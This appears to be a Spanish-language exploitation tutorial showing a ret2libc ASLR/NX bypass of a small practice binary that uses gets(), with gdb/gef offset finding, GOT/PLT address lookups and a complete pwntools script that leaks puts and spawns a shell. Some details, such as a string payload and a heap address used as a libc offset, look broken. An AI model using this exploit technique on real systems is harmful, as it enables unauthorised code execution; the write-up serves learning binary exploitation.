---
title: Bypass ASLR/NX
author: c4rta
date: 2022-08-11
categories: [Explotacion binaria]
tags: [bof stack based, ret2libc, aslr bypass]
---

## ASLR

La aleatorización de la disposición del espacio de direcciones (ASLR) es una funcion a nivel de kernel la cual permite que las direcciones del stack, librerias, etc, sean diferentes, esto hace que para explotar una vulnerabilidad en un binario se mas dificil

## Analizando el binario

El codigo del binario es el siguiente:

```c
#include<stdio.h>
#include<string.h>
int main(int argc, char *argv[]){
        char buf[100];
        puts("Input: ");
        gets(buf);
        printf(buf);
        return 0;
}
```

Como se puede ver el binario usa la funcion ```gets``` la cual no es segura de usar ya que no se controla la cantidad de datos a pasar, es decir que si tenemos un buffer de 100 y le pasamos 120, esos 20 de sobra los seguira almacenando.

## Calculando el offset el RIP

Ya se la saben banda, simplemente tenemos que meter el binario de un debugger, en mi caso usare gdb con [gef](https://github.com/hugsy/gef).

Ahora una vez dentro con el comando ```pattern create 150``` generaremos 150 carcteres que nos ayudara para sacar el offset del rip, esos caracteres se los pasaremos como input al programa, vemos que el programa peto y se ocasiono el buffer overflow

```
Program received signal SIGSEGV, Segmentation fault.
0x0000000000401187 in main ()
```
Ahora si vemos el RSP tiene los valores ```*RSP  0x7fffffffda68 ◂— 'jaaaaaaakaaaaaaalaaaaaaamaaa'``` estos son algunos de los caracteres que le pasamos de la cadena que se genero. Ahora con el comando ```patter offset``` le pasaremos 8 bytes de el RSP para saber el offset:

```
gef➤  patter offset jaaaaaaa
[+] Searching for 'jaaaaaaa'
[+] Found at offset 120 (little-endian search) likely
[+] Found at offset 113 (big-endian search) 
```

Vemos como el offset para llegar al RIP es ```120```

## Sacando las direcciones de puts y puts@got

Ahora viene la parte mas compleja, para esa practica tenemos que hacer 3 cosas 

- Sacar la direccion de puts@plt
- La direccion de main
- La direccion de puts@got

### Direccion de puts@plt

Esto lo hacemos ya que necesitamos llamar a puts y afortunadamente no se ve afectada por el ASLR, la primera manera de obtenerlos es poner el comando ```p  puts@plt``` en gdb, nos debe de mostrar algo como esto:

```
gef➤  p 'puts@plt'
$1 = {<text variable, no debug info>} 0x401030 <puts@plt>
```
Ahi podemos ver que es ```0x401030```.
Para la segunda forma podemos usar el comando ```objdump``` de la siguiente manera

```
objdump -d -M intel vuln | grep "puts@plt"
```
Y nos debe de mostrar algo como esto:

```
0000000000401020 <puts@plt-0x10>:
0000000000401030 <puts@plt>:
  40115f:	e8 cc fe ff ff       	call   401030 <puts@plt>
```
Vemos que es exactamente la misma direccion.

### La direccion de main

Esto es util ya que si el programa se detiene, ahora sabra que la direccion base del ASLR sera random otra vez.
Para esto en el gdb usaremos el comando ```p main``` y nos muesta esto:

```
gef➤  p main
$2 = {<text variable, no debug info>} 0x401146 <main>
```
Ahora sabemos que la direccion de main es ```0x401146```

### Direccion de puts@got

La primera forma de conseguirlo es usando el comando ```objdump``` pero ahora de esta forma ```objdump -R vuln```

```
objdump -R vuln                                                                    06:12:23 

vuln:     formato del fichero elf64-x86-64

DYNAMIC RELOCATION RECORDS
OFFSET           TYPE              VALUE 
0000000000403fe0 R_X86_64_GLOB_DAT  __libc_start_main@GLIBC_2.34
0000000000403fe8 R_X86_64_GLOB_DAT  _ITM_deregisterTMCloneTable@Base
0000000000403ff0 R_X86_64_GLOB_DAT  __gmon_start__@Base
0000000000403ff8 R_X86_64_GLOB_DAT  _ITM_registerTMCloneTable@Base
0000000000404018 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5 <--
0000000000404020 R_X86_64_JUMP_SLOT  printf@GLIBC_2.2.5
0000000000404028 R_X86_64_JUMP_SLOT  gets@GLIBC_2.2.5
```
Podemos ver que obtuvumos la direccion de ```puts@GLIBC```, esto es lo mismo que GOT solo que se obtiene el nombre de ```glibc``` ya que es la direccion externa de puts.

Para la segunda forma usaremos gdb, y la direccion que nos salio de puts@plt mostraremos su contenido con el comando ```disassemble 0x401030```, esto nos debe de mostrar esto:

```
gef➤  disassemble 0x401030
Dump of assembler code for function puts@plt:
   0x0000000000401030 <+0>:	jmp    QWORD PTR [rip+0x2fe2]        # 0x404018 <puts@got.plt>
```
Aun que sean diferentes podemos usar cualquiera de las dos.

## Sacando la direccion de pop rdi; ret

Para esta parte usaremos un gadget que nos servira para meter cualquier cosa a ```rdi``` (si aun no vez el post de ret2libc bypass NX te recomiendo verlo, ahi explico mas a detalle esto de ROP y los gadgets).

De igual manera podemos hacerlo de dos formas, la primera y mas sencilla es usar ROPgadget con el comando ```ROPgadget --binary vuln``` y buscar donde diga ```pop rdi ; ret``` (yo lo hare con ROPgadget), y la otra es calcularla a travez de la direccion de puts, esto lo haremos con el comando ```readelf``` de esta forma:

```
readelf -s /usr/lib/libc.so.6 | grep puts@@
```
Nos muestra la direccion
```
readelf -s /usr/lib/libc.so.6 | grep puts@@                                        06:39:55 
   808: 0000000000079280   294 FUNC    WEAK   DEFAULT   14 fputs@@GLIBC_2.2.5
  1429: 000000000007a6f0   409 FUNC    WEAK   DEFAULT   14 puts@@GLIBC_2.2.5
  1438: 000000000007a6f0   409 FUNC    GLOBAL DEFAULT   14 _IO_puts@@GLIBC_2.2.5
```
Y podriamos usar esta ```000000000007a6f0```

Lo que deben de modificar es la ruta de libc, la pueden sacar con el comando ldd

## Sacando los offsets de puts, system y /bin/sh usando libc

De igual manera usaremos el comando ```objdump``` pero ahora de esta forma 

System
```
objdump -d -M intel /usr/lib/libc.so.6 | grep "system" 
```
puts
```
objdump -d -M intel /usr/lib/libc.so.6 | grep "_IO_puts" 
```
Y ambos comandos nos deben de mostrar algo como esto:

```
000000000004ba40 <__libc_system@@GLIBC_PRIVATE>:
000000000007a6f0 <_IO_puts@@GLIBC_2.2.5>:
```

/bin/sh

Para esto usare el comando grep que viene incorporado en gef el comando grep, 

```
gef➤  grep "/bin/sh"
[+] Searching '/bin/sh' in memory
[+] In '[heap]'(0x405000-0x426000), permission=rw-
  0x405ac0 - 0x405ac7  →   "/bin/sh" 
  0x405ae0 - 0x405ae7  →   "/bin/sh" 
[+] In '/usr/lib/libc.so.6'(0x7ffff7da0000-0x7ffff7df8000), permission=r--
  0x7ffff7dbb26a - 0x7ffff7dbb271  →   "/bin/sh" 
```


## Ejecutando el exploit

```python
from pwn import *

p = process('./vuln')

main = 0x0401146
puts_got = 0x0000000000404018
puts_plt = 0x0000000000401030
gadget = 0x00000000004005f3

puts_libc = 0x000000000007a6f0
system_libc = 0x000000000004ba40
bin_sh = 0x405ac0

payload = b'A'*120 + p64(gadget) + p64(puts_got) + p64(puts_plt) + p64(main)

p.sendline(payload)
output = p.recvline()
output = output[:-1]
output += b'\x00\x00'
puts_libc_addr = u64(output)
system_libc_addr = puts_libc_addr - puts_libc + system_libc
sh_libc_addr = puts_libc_addr - puts_libc + bin_sh
payload = 'A'*120 + p64(gadget) + p64(sh_libc_addr) + p64(system_libc_addr) + p64(main)
p.sendline(payload)
p.interactive()
```
Y nos debe de mostrar algo como esto:

```
python3 exploit.py                                                      
[+] Starting local process './vuln': pid 9984
[*] Switching to interactive mode
$ whoami
omarh
```

Eso ha sido todo, gracias por leer ❤

![](/assets/img/commons/bypass-aslr/waifu.gif)